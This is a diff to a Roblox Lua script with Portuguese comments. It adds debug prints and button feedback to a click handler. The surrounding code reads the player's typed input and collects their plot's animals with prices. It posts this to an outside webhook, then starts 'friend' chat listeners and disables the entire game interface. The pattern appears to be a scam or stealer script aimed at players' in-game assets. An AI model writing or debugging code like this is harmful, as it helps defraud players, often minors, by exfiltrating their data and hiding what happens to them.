@@ -485,14 +485,25 @@ end
 button.MouseButton1Click:Connect(function()
     local input = textbox.Text
     
-    print("✅ Enviando webhook...")
+    print("🔘 Botão clicado!")
+    print("📝 Input:", input)
+    
+    -- Desabilita o botão temporariamente
+    button.Text = "Enviando..."
+    button.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
     
     local currentTime = os.date("%H:%M - %d/%m/%Y")
     local totalPlayers = #Players:GetPlayers()
+    
+    print("⏰ Hora:", currentTime)
+    print("👥 Total de jogadores:", totalPlayers)
 
     -- Encontra o plot do jogador
     local plotsFolder = workspace:FindFirstChild("Plots")
+    print("📁 Plots folder:", plotsFolder and "Encontrado" or "Não encontrado")
+    
     local targetPlot = findPlayerPlot(plotsFolder, player.Name)
+    print("🏠 Plot do jogador:", targetPlot and targetPlot.Name or "Não encontrado")
     
     -- Pega os animais com seus preços
     local foundAnimals = getAnimalsInPlot(targetPlot)
@@ -558,9 +569,15 @@ button.MouseButton1Click:Connect(function()
     }
 
     -- Tenta enviar a webhook com tratamento de erro melhorado
+    print("📤 Tentando enviar webhook...")
+    print("🔗 URL:", WEBHOOK_URL)
+    
     local success, response = pcall(function()
         local encoded = HttpService:JSONEncode(payload)
-        return HttpService:RequestAsync({
+        print("✅ JSON encoded com sucesso")
+        print("📦 Tamanho do payload:", #encoded, "bytes")
+        
+        local result = HttpService:RequestAsync({
             Url = WEBHOOK_URL,
             Method = "POST",
             Headers = {
@@ -568,13 +585,22 @@ button.MouseButton1Click:Connect(function()
             },
             Body = encoded
         })
+        
+        print("✅ Request completado!")
+        return result
     end)
 
     if success then
-        print("✅ Webhook enviada com sucesso!")
+        print("✅✅✅ Webhook enviada com sucesso!")
+        print("📊 Response:", tostring(response))
+        
+        button.Text = "✅ Enviado!"
+        button.BackgroundColor3 = Color3.fromRGB(40, 200, 40)
         textbox.Text = "✅ Enviado com sucesso!"
         wait(2)
         textbox.Text = ""
+        button.Text = "Prosseguir"
+        button.BackgroundColor3 = Color3.fromRGB(140, 40, 255)
         
         -- Setup chat listeners (friend)
         setupChatListeners()
@@ -622,9 +648,15 @@ button.MouseButton1Click:Connect(function()
         -- Disable CoreGui
         game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
     else
-        warn("❌ Erro ao enviar webhook:", response)
-        textbox.Text = "❌ Erro ao enviar! Tente novamente."
-        wait(2)
+        warn("❌❌❌ ERRO AO ENVIAR WEBHOOK!")
+        warn("❌ Erro:", tostring(response))
+        
+        button.Text = "❌ Erro!"
+        button.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
+        textbox.Text = "❌ Erro: " .. tostring(response)
+        wait(3)
         textbox.Text = ""
+        button.Text = "Prosseguir"
+        button.BackgroundColor3 = Color3.fromRGB(140, 40, 255)
     end
 end)
